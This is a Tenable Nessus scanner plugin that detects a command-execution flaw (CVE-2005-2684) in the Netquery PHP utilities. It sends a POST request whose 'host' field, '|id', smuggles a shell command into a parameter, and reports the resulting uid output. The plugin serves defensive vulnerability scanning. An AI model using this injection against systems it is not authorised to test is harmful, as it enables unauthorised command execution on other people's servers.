#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to a
arbitrary command execution vulnerability. 

Description :

The remote host is running Netquery, a suite of network information
utilities written in PHP. 

The installed version of Netquery lets an attacker execute arbitrary
commands within the context of the affected web server user id by
passing them through the 'host' parameter of the 'nquser.php' script. 

See also : 

http://retrogod.altervista.org/netquery311.html

Solution : 

Upgrade to Netquery 3.2 or later, as that is rumored to address the
issue. 

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19503);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2684");
  script_bugtraq_id(14637);

  name["english"] = "Netquery <= 3.11 Arbitrary Command Execution Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for arbitrary command execution vulnerability in Netquery <= 3.11";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "postnuke_detect.nasl", "xaraya_detection.nasl", "xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
npaths = 0;
#
# - standalone version.
foreach dir (cgi_dirs()) {
  paths[npaths++] = string(dir, "/nquser.php");
}
# - Postnuke module.
install = get_kb_item(string("www/", port, "/postnuke"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=Netquery");
  }
}
# - Xaraya module.
install = get_kb_item(string("www/", port, "/xaraya"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=netquery");
  }
}
# - Xoops module.
install = get_kb_item(string("www/", port, "/xoops"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/modules/netquery/index.php");
  }
}


# Loop through each path.
foreach path (paths) {
  # Check whether nquser.php exists.
  req = http_get(item:path, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like Netquery w/ dig enabled...
  if (egrep(string:res, pattern:'<input name="b4" .*src=".+/btn_dig\\.gif"')) {
    # Try to exploit the flaw to run a command.
    postdata = string(
      "querytype=dig&",
      # nb: run 'id'.
      "host=|id&",
      "digparam=ANY"
    );
    req = string(
      "POST ", path, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        output = eregmatch(pattern:pat, string:match);
        if (!isnull(output)) {
          output = output[1];
          break;
        }
      }
    }
    if (output) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to execute the command 'id' on the remote host.\n",
        "\n",
        "  Request:  POST ", path, "\n",
        "  Output:   ", output, "\n"
      );
      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
